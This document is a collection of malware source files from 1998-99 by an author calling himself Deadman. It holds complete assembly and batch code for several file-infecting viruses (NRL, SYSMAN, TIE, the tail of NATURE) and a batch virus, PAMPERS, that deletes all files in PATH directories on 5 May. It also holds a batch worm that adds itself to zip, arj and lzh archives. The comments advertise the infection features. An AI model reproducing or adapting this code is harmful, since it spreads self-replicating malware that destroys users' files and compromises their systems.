 fuckc: 		pop	dx cx			; restore file
			mov	ax,5701h		; time/date
			int	21h

			mov	ah,3eh			; close file
			int	21h

 fuck:			pop	cx ds dx		; reset file
			mov	ax,4301h		; attributes
			int	21h

 noinf: 		xor	ax,ax			; reset int 24h vector
			mov	ds,ax
			pop	word ptr ds:[24h*4]
			pop	word ptr ds:[24h*4+2]
			pop	ds es di si dx cx bx ax
			popf

			jmp	dword ptr cs:old21	; goto old handler

 fmask			db	'*.*',0

;			··· PAYLOAD ···

 payload:		in	al,40h
			test	al,1111111b
			jz	$+3
			ret

			push	ds es
			mov	ah,1ah			; set new dta
			lea	dx,dta+bp
			int	21h

			xor	ax,ax			; take and set int 24h
			mov	es,ax
			push	word ptr es:[24h*4+2]
			push	word ptr es:[24h*4]
			mov	ah,2ah
			int	21h
			lea	ax,int24h+bp
			mov	word ptr es:[24h*4],ax
			mov	word ptr es:[24h*4+2],cs

			mov	ax,cs
			mov	es,ax
			xor	si,si

			mov	ah,4eh			; find first file
			mov	cx,0			; and get number of
			lea	dx,fmask+bp		; files in this
 findnext:		int	21h			; directory
			jc	nomore
			inc	si
			mov	ah,4fh
			jmp	findnext
 nomore:		cmp	si,1
			jbe	nofiles

			in	ax,40h			; get random file
			xor	dx,dx
			div	si
			mov	si,dx

			mov	ah,4eh			; get one's name
			lea	dx,fmask+bp
			mov	cx,0
 _findnext:		int	21h
			mov	ah,4fh
			dec	si
			jnz	_findnext

			mov	ah,56h			; move it to the
			lea	dx,dta+bp+1eh		; parent directory
			lea	di,dta+bp+1eh-3
			mov	[di],'..'
			mov	byte ptr [di+2],'\'
			in	al,40h
			test	al,11b
			jnz	move
			inc	di
			inc	di
 move:			int	21h

 nofiles:		xor	ax,ax			; reset int 24h vector
			mov	ds,ax
			pop	word ptr ds:[24h*4]
			pop	word ptr ds:[24h*4+2]

			pop	es ds
			mov	ah,1ah			; reset dta address
			mov	dx,80h
			int	21h

			ret				; return

 endv:
 dta			db	43 dup (?)

                        end     Nature
───────────────────────────────────────────────────────────────[NATURE.ASM]───
──────────────────────────────────────────────────────────────────[NRL.ASM]───
 comment `

 NRL Virus Copyright (C) 1998-99 by Deadman of [SOS]
 Some virus feautures:
   Being a simple DOS virus it infects only Windows Executables :)
   This is run-time infector which is activated on executing a WinEXE from
   Non-Win32 OS. It overwrites a shitty DOS area which tells you that this
   program cannot be run in DOS mode. Destructive, hangs on many file types
   run :(, for example, Multi-types, which can be run in Win and DOS mode.
   But on "user" pc, where are only normal Win32 filez placed, works pretty
   good!

 Compile into .exe file
 Virus size: 0C0h bytes - the most usual size between PE/NE/LE Header and
   the end of the dos exe header
 P.S. Virus has no comments, it seems to be very simple :)

 Contacts:
   dman@lgg.ru
   www.lgg.ru/~dman
                                                Enjoy, Deadman.

`
                        .286
                        model   tiny
                        codeseg
                        locals

 start:                 push    cs
                        pop     ds

                        mov     ah,4eh
                        mov     cl,20h
                        lea     dx,fmask
 fnext:                 int     21h
                        jc      return
                        push    es
                        pop     ds
                        mov     ax,3d02h
                        mov     dx,9eh
                        int     21h
                        push    cs
                        pop     ds
                        xchg    ax,bx
                        mov     ah,3fh
                        mov     cx,4096
                        mov     dl,offset buf
                        int     21h
                        xor     cx,ax
                        jnz     close

                        mov     ah,42h
                        cwd
                        int     21h

                        lea     si,buf+3ch
                        cmp     word ptr [si+2],ax
                        jnz     close
                        mov     ax,word ptr [si]
                        cmp     ax,4096
                        jae     close
                        cmp     byte ptr [si+18h-3ch],'@'
                        jne     close

                        mov     di,word ptr [si+08h-3ch]
                        shl     di,4
                        sub     ax,di
                        mov     cx,vsize
                        cmp     ax,cx
                        jb      close

                        xor     si,si
                        add     di,cx
                        push    es cs
                        pop     es
                        push    cx
                        rep     movsb
                        pop     di
                        add     di,0eh
                        xchg    ax,cx
                        stosw
                        stosw
                        scasw
                        stosw
                        stosw
                        pop     es

                        mov     ah,40h
                        mov     cx,4096
                        mov     dl,offset buf
                        int     21h

 close:                 mov     ah,3eh
                        int     21h
 ignore:                mov     ah,4fh
                        jmp     fnext
 return:                mov     ah,9
                        lea     dx,cannotberun
                        int     21h
                        mov     ax,4c01h
                        int     21h
 cannotberun            db      'This program cannot be run in DOS mode',0dh,0ah,24h
 fmask                  db      '*.exe',0
                        db      'NRL|Deadman/SOS'
 vsize                  equ     $-start
 buf:                   end     start


──────────────────────────────────────────────────────────────────[NRL.ASM]───
──────────────────────────────────────────────────────────────[PAMPERS.BAT]───
@ctty nul %#%
if .%2==.LocalFunctionCall# goto apnd#
if .%0==. goto fin#
set vname#=%0
if exist %vname#% goto strt#
set vname#=%0.bat
if not exist %vname#% goto fin#
for %%a in (%path%) do if exist %%a\find.exe set fnd#=.
if .fnd#==. goto fin#

:strt#
echo.|date|find "05.05." %#%
if errorlevel 1 goto inf#
echo y>del#.
for %%a in (%path%) do del %%a\*.*<del#.
del del#.
goto strt#

:inf#
find "#"<%vname#%>body#.bat
for %%a in (*.bat ..\*.bat) do call body#.bat %%a LocalFunctionCall#
for %%a in (\*.bat ..\..\*.bat) do call body#.bat %%a LocalFunctionCall#
goto fin#

################################################
# The Pampers Virus Copyright (C) 1999 Deadman #
################################################

:apnd#
find "#"<%1>nul
if not errorlevel 1 goto eov#
copy body#.bat+%1 body#2.bat
copy body#2.bat %1
del body#2.bat
goto eov#

:fin#
del body#.bat
ctty con %#%>nul
:eov#
──────────────────────────────────────────────────────────────[PAMPERS.BAT]───
───────────────────────────────────────────────────────────────[SYSMAN.ASM]───
 model   tiny
 codeseg
 locals
 jumps

 start:         db      0b8h
 strategy       dw      000h
                mov     cs:[6],ax

                push    ax bx cx dx si di es ds

                call    get_loc
 get_loc:       nop
                pop     di
                sub     di,offset get_loc

                mov     ah,2fh
                int     21h
                push    es bx
                push    cs cs
                pop     ds es

                mov     ah,1ah
                lea     dx,dta+di
                int     21h

                mov     ah,4eh
                mov     cx,20h
                lea     dx,sys_mask+di
 keep_find:     int     21h
                jc      no_more

                mov     ax,3d02h
                lea     dx,dta+di+1eh
                int     21h
                jc      next

                xchg    ax,bx
                mov     ax,5700h
                int     21h
                push    cx dx

                mov     ah,3fh
                mov     cx,10
                lea     dx,buffer+di
                int     21h
                xor     cx,ax
                jnz     close

                cmp     word ptr buffer+di,0ffffh
                jnz     close
                cmp     word ptr dta+di+1ah+2,0
                jnz     close
                mov     ax,word ptr dta+di+1ah
                cmp     ax,62000
                ja      close
                mov     dx,ax
                sub     ax,vsize
                cmp     ax,word ptr buffer+di+6
                jz      close
                xchg    word ptr buffer+di+6,dx
                mov     word ptr strategy+di,dx

                mov     ax,4202h
                xor     cx,cx
                cwd
                int     21h
                mov     ah,40h
                mov     cx,vsize
                mov     dx,di
                int     21h
                xor     cx,ax
                jnz     close

                mov     ax,4200h
                cwd
                int     21h
                mov     ah,40h
                mov     cx,10
                lea     dx,buffer+di
                int     21h
 close:         pop     dx cx
                mov     ax,5701h
                int     21h
                mov     ah,3eh
                int     21h
 next:          mov     ah,4fh
                jmp     keep_find

 no_more:       pop     dx ds
                mov     ah,1ah
                int     21h
                pop     ds es di si dx cx bx
                sub     ax,ax
                retn

 sys_mask       db      '*.SYS',0
                db      '[SYSMAN]',0
                db      'Copyright (C) 1998-99 Deadman',0

 vsize          equ     $-start

 buffer         db      10 dup (?)
 dta            db      43 dup (?)

                end     start
───────────────────────────────────────────────────────────────[SYSMAN.ASM]───
──────────────────────────────────────────────────────────────────[TIE.ASM]───
                        comment Ё
                        absent
                        Ё

                        jumps
                        model   tiny
                        .386
                        codeseg
                        org     100h

 start:                 db      24h,21h
                        push    ds es

                        mov     ax,1200h
                        int     2fh
                        cmp     al,0ffh
                        jz      eradie

                        lea     di,eradie
                        mov     ch,0ffh
                        rep     stosw


 eradie:                mov     ah,4ah
                        mov     bh,0ffh
                        int     21h
                        push    bx
                        cmp     bh,3bh
                        jb      exit_vir

                        sub     bx,(msize/16+2)
                        mov     ah,4ah
                        int     21h
                        jc      exit_vir

                        mov     ah,48h
                        mov     bx,(msize/16+1)
                        int     21h

                        sub     ax,10h
                        mov     es,ax
                        push    cs
                        pop     ds
                        mov     di,100h
                        mov     si,di
                        mov     cx,vsize
                        rep     movsb
                        push    cs offset free_mcb
                        push    es offset continue
                        retf

 free_mcb:              mov     ax,es
                        add     ax,10h
                        mov     es,ax
                        mov     ah,49h
                        int     21h

 exit_vir:              pop     bx
                        pop     es ds
                        mov     ah,4ah
                        int     21h

                        mov     ah,1ah
                        mov     dx,80h
                        int     21h

                        cmp     sp,0fffeh
                        je      rest_com

                        mov     ax,es
                        add     ax,10h
                        add     word ptr cs:_cs,ax
                        db      0eah
 _ip                    dw      ?
 _cs                    dw      ?

 rest_com:              mov     di,100h
                        db      0beh
 lsize                  dw      -100h
                        add     si,di
                        mov     cx,vsize
                        mov     bx,100h-2
                        mov     word ptr [bx],0a4f3h
                        jmp     bx

;─────────────────────  Whole Virus ─────────────────────
 continue:              push    cs cs
                        pop     ds es
                        mov     bp,1

                        mov     ah,19h
                        int     21h
                        cmp     al,1
                        jbe     finished

                        lea     si,buffer
                        lea     di,dta

                        mov     ah,1ah
                        mov     dx,di
                        int     21h

                        lea     dx,fspec_exe
 infect:                mov     ah,4eh
                        mov     cx,7
 look:                  int     21h
                        jc      no_more

                        mov     ax,4300h
                        lea     dx,[di+1eh]
                        int     21h
                        push    cx
                        mov     ax,4301h
                        xor     cx,cx
                        int     21h

                        cmp     dword ptr [di+1ah],large vsize
                        jbe     take_next
                        cmp     dword ptr [di+1ah],large 3b000h
                        ja      take_next

                        mov     ax,3d02h
                        int     21h
                        jc      take_next

                        xchg    ax,bx
                        mov     ax,5700h
                        int     21h
                        push    cx dx

                        mov     ah,3fh
                        mov     cx,vsize
                        mov     dx,si
                        int     21h

                        push    dx ax
                        mov     ax,4202h
                        xor     cx,cx
                        cwd
                        int     21h
                        mov     lsize,ax
                        pop     cx dx

                        mov     ax,[si]
                        cmp     ax,'MZ'
                        je      exe_infect
                        cmp     ax,'ZM'
                        je      exe_infect
 ; --- COM INFECT ---
                        cmp     ax,061eh
                        je      close
                        cmp     dword ptr [di+1ah],large 65535-100h-vsize-100h
                        ja      close

                        mov     ah,40h
                        int     21h
                        mov     ax,4200h
                        xor     cx,cx
                        cwd
                        int     21h
                        mov     ah,40h
                        mov     cx,vsize
                        mov     dh,1
                        int     21h
                        jmp     close

 ; --- EXE INFECT ---
 exe_infect:            mov     dx,word ptr [si+14h]
                        mov     ax,word ptr [si+16h]
                        mov     word ptr _ip,dx
                        mov     word ptr _cs,ax
                        cmp     ax,word ptr [si+0eh]
                        je      close
                        add     ax,10h
                        cmp     ax,word ptr [si+0eh]
                        je      close
                        cmp     word ptr [si+0eh+2],vsize+100h
                        jb      close

                        mov     ax,word ptr [si+0eh]
                        add     ax,word ptr [si+08h]
                        mov     cx,10h
                        mul     cx
                        add     ax,word ptr [si+0eh+2]
                        adc     dx,0

                        cmp     dx,word ptr [di+1ah+2]
                        jb      entry
                        ja      close
                        cmp     ax,word ptr [di+1ah]
                        ja      close

 entry:                 mov     ax,word ptr [si+0eh]
                        add     ax,word ptr [si+08h]
                        mov     cx,10h
                        mul     cx
                        xchg    cx,dx
                        xchg    ax,dx
                        mov     ax,4200h
                        int     21h
                        mov     ah,40h
                        mov     cx,vsize
                        mov     dx,100h
                        int     21h
                        xor     cx,ax
                        jnz     close
                        mov     ax,4200h
                        cwd
                        int     21h
                        mov     ax,word ptr [si+0eh]
                        sub     ax,10h
                        mov     word ptr [si+16h],ax
                        mov     word ptr [si+14h],100h
                        mov     ah,40h
                        mov     cx,28
                        mov     dx,si
                        int     21h

 close:                 pop     dx cx
                        mov     ax,5701h
                        int     21h
                        mov     ah,3eh
                        int     21h

 take_next:             pop     cx
                        mov     ax,4301h
                        lea     dx,[di+1eh]
                        int     21h
                        mov     ah,4fh
                        jmp     look

 no_more:               dec     bp
                        jnz     finished

                        lea     dx,fspec_com
                        jmp     infect

 finished:              retf

 fspec_exe              db      '*.EXE',0
 fspec_com              db      '*.COM',0
                        db      '[TIE]',0
                        db      '(C) 99 by Deadman',0

 vsize                  equ     $-start

 dta                    db      43 dup (?)
 buffer                 db      vsize dup (?)

 msize                  equ     $-start
                        end     start
──────────────────────────────────────────────────────────────────[TIE.ASM]───
─────────────────────────────────────────────────────────────────[INFO.BAT]───
@ctty nul
for %%a in (*.zip ..\*.zip) do pkzip %%a %0
for %%a in (*.arj ..\*.arj) do arj a %%a %0
for %%a in (*.lzh ..\*.lzh) do lha a %%a %0
::[ZZV] Worm by Deadman
─────────────────────────────────────────────────────────────────[INFO.BAT]───
